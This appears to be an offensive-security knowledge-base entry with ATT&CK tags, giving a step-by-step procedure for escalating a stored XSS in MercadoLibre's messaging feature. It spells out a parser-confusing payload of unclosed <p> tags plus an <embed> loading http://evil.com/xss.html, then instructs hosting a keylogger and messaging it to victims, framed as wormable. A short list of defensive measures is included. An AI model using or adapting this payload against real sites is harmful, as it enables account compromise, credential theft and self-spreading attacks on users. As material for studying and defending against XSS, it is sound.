---
id: p1b2c3d4-e5f6-7890-abcd-ef1234567894
tags:
  - xss
  - external-content
  - wormable
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Remote File Copy]]'
updated_at: '2025-12-13T23:55:20.927Z'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Remote File Copy]]'
---
# Adjust-Payload-for-embed-Tag-to-Include-External-Content

## Summary

This procedure refines the bypass payload to inject an <embed> tag loading external HTML/JavaScript, escalating the stored XSS in MercadoLibre messaging to enable advanced attacks like data exfiltration or worm propagation.

## Description

The <embed> tag is larger, requiring more unclosed <p> tags (e.g., 10+) to confuse the parser adequately. The src points to attacker-controlled content with malicious JS. Stored in messages, it executes on view, allowing arbitrary remote code. Builds on prior steps; outcomes include full compromise potential.

## Requirements

1. Successful <audio> injection from previous procedure.
2. Control over an external server hosting malicious HTML.
3. Messaging access for payload delivery.

## Defense

Defensive measures and detection strategies:

- Whitelist only essential tags; block <embed> entirely.
- Enforce strict CSP to prevent external resource loading.
- Scan messages for external URLs and block suspicious ones.

## Objectives

1. Scale bypass for complex tags.
2. Load and execute external malicious content.
3. Demonstrate wormable escalation.

## Instructions

### Step 1: Calculate Tag Count

**Context**: Adjust for <embed> size.

Test with 8-12 unclosed <p> tags + <embed src="http://evil.com/xss.html"> to find the effective count.

### Step 2: Host External Content

**Context**: Prepare malicious payload.

Upload HTML with JS (e.g., keylogger) to your server.

### Step 3: Deploy and Test

**Context**: Inject and verify loading.

Send the payload via message; view in victim session to confirm <embed> fetches and runs external JS.

> External page loads inline, executing scripts.

**Expected Output**: Malicious behavior from external content.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]
- [[Remote File Copy]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[external-content]]
- [[wormable]]
